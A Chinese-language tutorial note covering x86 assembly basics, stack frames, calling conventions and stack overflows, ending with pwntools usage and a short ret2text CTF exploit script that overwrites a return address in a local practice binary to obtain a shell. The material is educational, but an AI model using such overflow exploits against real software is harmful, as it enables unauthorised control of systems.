
## 汇编基础

简单 X86 汇编
学习汇编应该了解的方向
+ 寄存器模式及定义
+ 指令集

CPU 内部寄存器之间的数据传送

```asm
MOV AL,DH   ; AL  <- DH  (8位)
MOV DX,AX   ; DX  <- AX  (16位)
MOV EAX,ESI ; EAX <- ESI (32位)
```
CPU 内部寄存器和存储器之间的数据传输

```asm
MOV [BX],AX   ; 间接寻址 (16位)
MOV EAX,[EBX+ESI]   ;基址变址寻址 (32位)
MOV AL,BLOCK ; BLOCK 为变量名，直接寻址 (8位)
```
立即数和通用寄存器，存储器
```asm
MOV EAX,123456H; EAX<-123456H (32位)
MOV [BX],12H ; 间接寻址 (8位)
MOV AX,1234H; AX<-1234H (16位)
```

ADD/SUB/INC/DEC/MUL/DIV/AND/OR/XOR/NOT
例如 ADD EAX,EBX; EAX = EAX + EBX

CMP 比较指令 (重点)
cmp 指令是实现逻辑判断的核心，cmp指令通过对两个操作数进行减法操作， <font color="red">  仅记录标志位信息，而不保存结果 </font>

+ OF (Overflow Flag) 溢出标志，溢出时为1，否则置为0。
+ SF (Sign Flag) 符号标志，结果为负时置为1，否则为0。
+ ZF (Zero Flag) 零标志，运算结果为0时ZF 为1，否则置为0。
+ CF (Carry Flag) 进位标志，进位时置为1，否则置为0。

栈是我们做PWN时的一个十分重要的数据结构，栈区也是一个需要注意的内存区域，重点来了解栈相关的汇编操作。

栈是一种数据结构，从感性上来说，我们可以将它想象为一只羽毛球筒，球只能从筒口插入，从另外一个筒口取出

栈具有 push 和 pop 两种操作。分别叫做入栈与出栈

```x86asm
push eax  ; 将 eax 寄存器的值入栈
esp -= 4
pop eax   ; 将栈顶的值弹出给 eax 寄存器
esp += 4
```
进程中每个函数在运行过程中都要保存自己的临时数据，这些数据就会被保存在栈上。

但是不同的函数不能把数据放在一起，每个函数都要有自己的栈空间。系统给出的解决方案就是栈帧

栈帧指的就是一个函数在运行时使用的栈空间，它由 esp 和 ebp 表示边界.

esp 与 ebp 是CPU 中的两个特殊寄存器，esp 叫做栈顶指针寄存器，ebp 叫做栈底指针寄存器。两个寄存器专门用来表示 stack 范围。



## 函数调用约定

调用约定规范了函数之间调用的方式，参数如何传递，返回值如何传递，栈由谁来平衡。

1. `__cdecl`
`__cdecl` 调用约定又称 C 调用约定，是 C/C++ 语言缺省的调用约定。参数按照从右至左的方式入栈，函数本身不清理栈，此工作由调用者负者，返回值在 EAX 中。由于由调用者清理栈，所以允许可变参数函数存在，如 `int sprintf(char* buffer,const* format,...);`
2. `__stdcall` 
`__stdcall` 很多时候被称为 pascal 调用约定。pascal 语言是早期很常见的一种教学用计算机程序设计语言，其语法严谨。参数安装从右至左的方式入栈，函数自身清理堆栈，返回值在 EAX 中。
3. `__fastcall`
`__fastcall` 顾名思义，`__fastcall` 的特点就是快，因为它通过 CPU 寄存器来传递参数。它用 ECX 和 EDX 传送前两个双字 (DWORD) 或更小的参数，剩下的参数按照从右至左的方式入栈，函数自身清理堆栈，返回值在 EAX 中。


栈溢出

刚刚我们了解过了栈的相关知识，那么什么是栈溢出呢?

1. 注意栈地址是高地址向低地址增长的，下方是低地址，上方是高地址。
2. 我们输入是低地址想高地址增长的,如果我们输入的数据过多，就会写完当前局部变量后继续覆盖其它变量，结果可能就会导致覆盖到 `return addr` 导致劫持程序的控制流。


## PWN 基础知识

## `ret2text`

通过 pwndbg 中的一个小工具 cyclic,可以直接生成具有一定规律的字符串，用于我们确定偏移

我们可以使用 `cyclic -l daab` 来确定偏移.


pwntools 常用API

```python
process() 加载本地二进制文件，启动进程
remote() 连接远程服务器
sendline() 发送数据 (包括回车)
send() 发送数据 (不包括回车)
interactive() 启动交互模式，通常获取 shell 之后利用这个 API 手动交互
p64(),p32()等 封装发送数据的字节序，例如：p64(0x1001) -> \x01\x10
u64(),u32() 等： 解封装接受到的数据
recv() 接受数据
recvuntil(xxx) 接收到 xxx 才继续执行

gdb.attach(xxx) : 启动 gdb 并自动附加，可选参数 xxx,在启动 gdb 时执行一些命令
context(log_level="xxx") 设置调试信息等级
```


```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
s = process("./ret2text")
# gdb.attach(s,'b *0x080486b3\nc')
payload = "A"*112 + p32(0x0804863a)
s.sendline(payload)
s.interactive()
```



